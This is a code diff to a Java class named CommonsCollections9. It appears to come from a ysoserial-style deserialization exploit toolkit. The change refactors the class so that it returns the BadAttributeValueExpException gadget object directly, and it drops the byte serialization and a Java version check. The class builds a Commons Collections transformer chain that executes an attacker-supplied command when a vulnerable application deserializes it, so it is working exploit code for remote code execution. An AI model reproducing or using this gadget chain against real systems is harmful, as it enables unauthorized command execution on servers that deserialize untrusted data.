@@ -18,7 +18,7 @@ import java.util.Map;
 
 public class CommonsCollections9 implements ObjectPayload<BadAttributeValueExpException>{
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public BadAttributeValueExpException getObject(PayloadType type, String... param) throws Exception {
         String                        command            = param[0];
         String[]                      execArgs           = {command};
         Class                         c                  = (execArgs.length > 1) ? String[].class : String.class;
@@ -30,22 +30,6 @@ public class CommonsCollections9 implements ObjectPayload<BadAttributeValueExpEx
         BadAttributeValueExpException val                = new BadAttributeValueExpException(null);
         Reflections.setFieldValue(val, "val", entry);
         Reflections.setFieldValue(chainedTransformer, "iTransformers", transformers);
-
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(val);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public BadAttributeValueExpException getObject(String command) throws Exception {
-        return null;
-    }
-
-    public static boolean isApplicableJavaVersion() {
-        return JavaVersion.isBadAttrValExcReadObj();
+        return val;
     }
 }
